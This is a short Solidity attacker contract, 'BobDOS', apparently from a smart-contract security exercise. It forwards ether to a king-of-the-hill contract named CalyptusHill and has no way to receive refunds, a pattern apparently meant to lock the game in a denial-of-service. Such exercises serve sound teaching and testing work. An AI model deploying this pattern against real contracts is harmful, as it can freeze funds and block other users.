// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {CalyptusHill} from "./CalyptusHill.sol";

contract BobDOS {
    CalyptusHill hill;

    constructor(address payable  _hill) {
        hill = CalyptusHill(_hill);
    }

    function getOnTop() public payable {
        payable(address(hill)).call{value : msg.value}("");
    }
}